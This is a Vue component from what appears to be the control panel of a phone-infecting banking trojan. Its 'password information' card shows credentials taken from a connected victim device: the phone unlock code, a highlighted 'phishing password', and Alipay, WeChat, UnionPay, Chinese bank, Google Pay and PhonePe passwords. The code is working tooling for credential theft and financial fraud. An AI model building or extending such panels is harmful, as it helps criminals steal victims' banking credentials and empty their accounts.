<script setup lang="ts">
import { computed } from 'vue';
import {
    NCard,
    NTag,
    NIcon,
    NEmpty,
} from 'naive-ui';
import {
    KeyOutline,
    LockClosedOutline,
    WalletOutline,
    CardOutline,
    LogoGoogle,
    PhonePortraitOutline,
} from '@vicons/ionicons5';
import type { PasswordData } from '@/types/websocket';

interface Props {
    passwords: PasswordData | null | undefined;
    isConnected?: boolean;
}

const props = defineProps<Props>();

// 密码字段配置（按照 info.php 的 pwdLabels 顺序）
const passwordFields = [
    { key: 'phone', label: '手机密码', icon: LockClosedOutline },
    { key: 'phish', label: '钓鱼密码', icon: KeyOutline, highlight: true },
    { key: 'alipay', label: '支付宝', icon: WalletOutline },
    { key: 'wechat', label: '微信', icon: WalletOutline },
    { key: 'yun', label: '云闪付', icon: WalletOutline },
    { key: 'jian', label: '建设银行', icon: CardOutline },
    { key: 'you', label: '邮储银行', icon: CardOutline },
    { key: 'nong', label: '农业银行', icon: CardOutline },
    { key: 'zhong', label: '中国银行', icon: CardOutline },
    { key: 'gong', label: '工商银行', icon: CardOutline },
    { key: 'zhao', label: '招商银行', icon: CardOutline },
    { key: 'gpay', label: 'Google Pay', icon: LogoGoogle },
    { key: 'phonepe', label: 'PhonePe', icon: PhonePortraitOutline },
    { key: 'bc', label: 'BC', icon: CardOutline },
    { key: 'mb', label: 'MB', icon: CardOutline },
] as const;

// 判断密码是否有值
const hasValue = (value: string | undefined) => {
    return value && value !== '' && value !== '--' && value.trim().length > 0;
};

// 计算是否有任何密码数据
const hasAnyPassword = computed(() => {
    if (!props.passwords) return false;
    return passwordFields.some(field => 
        hasValue(props.passwords?.[field.key as keyof PasswordData])
    );
});

// 获取密码值
const getPasswordValue = (key: string) => {
    const value = props.passwords?.[key as keyof PasswordData];
    return hasValue(value) ? value : '--';
};
</script>

<template>
    <NCard size="small" class="password-info-card">
        <template #header>
            <div class="card-header">
                <div class="header-title">
                    <NIcon :component="KeyOutline" size="18" />
                    <span>密码信息</span>
                </div>
                <NTag
                    v-if="hasAnyPassword"
                    type="success"
                    size="tiny"
                    round
                >
                    有数据
                </NTag>
            </div>
        </template>

        <div v-if="!isConnected" class="no-connection">
            <NIcon :component="KeyOutline" size="32" class="no-connection-icon" />
            <div>请连接设备获取密码</div>
        </div>

        <div v-else-if="!passwords" class="loading-state">
            <div class="loading-spinner"></div>
            <div>正在获取密码数据...</div>
        </div>

        <div v-else-if="!hasAnyPassword" class="no-data">
            <NEmpty description="暂无密码数据" size="small" />
        </div>

        <div v-else class="password-list">
            <div
                v-for="field in passwordFields"
                :key="field.key"
                class="password-row"
            >
                <div class="password-label">
                    <NIcon :component="field.icon" size="14" />
                    <span>{{ field.label }}</span>
                </div>
                <div
                    class="password-value"
                    :class="{
                        'has-data': hasValue(passwords[field.key as keyof PasswordData]),
                        'highlight': field.highlight && hasValue(passwords[field.key as keyof PasswordData])
                    }"
                >
                    {{ getPasswordValue(field.key) }}
                </div>
            </div>
        </div>
    </NCard>
</template>

<style scoped>
.password-info-card {
    background: white;
}

.password-info-card :deep(.n-card__header) {
    padding: 16px 20px;
    border-bottom: 1px solid #f1f5f9;
}

.card-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.header-title {
    display: flex;
    align-items: center;
    gap: 8px;
    font-weight: 600;
    font-size: 15px;
    color: #1e293b;
}

.password-list {
    display: flex;
    flex-direction: column;
    gap: 2px;
    max-height: 300px;
    overflow-y: auto;
}

.password-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 8px 0;
    border-bottom: 1px solid #f8fafc;
}

.password-row:last-child {
    border-bottom: none;
}

.password-label {
    display: flex;
    align-items: center;
    gap: 6px;
    color: #64748b;
    font-size: 12px;
}

.password-value {
    font-size: 12px;
    font-family: 'JetBrains Mono', monospace;
    color: #94a3b8;
    text-align: right;
    max-width: 60%;
    word-break: break-all;
}

.password-value.has-data {
    color: #10B981;
    font-weight: 500;
}

.password-value.highlight.has-data {
    color: #F59E0B;
    font-weight: 600;
}

.no-connection,
.loading-state,
.no-data {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 30px 20px;
    color: #94a3b8;
    text-align: center;
    font-size: 13px;
}

.no-connection-icon {
    margin-bottom: 12px;
    color: #cbd5e1;
}

.loading-spinner {
    width: 24px;
    height: 24px;
    border: 2px solid #e2e8f0;
    border-top-color: #3B82F6;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 12px;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}
</style>
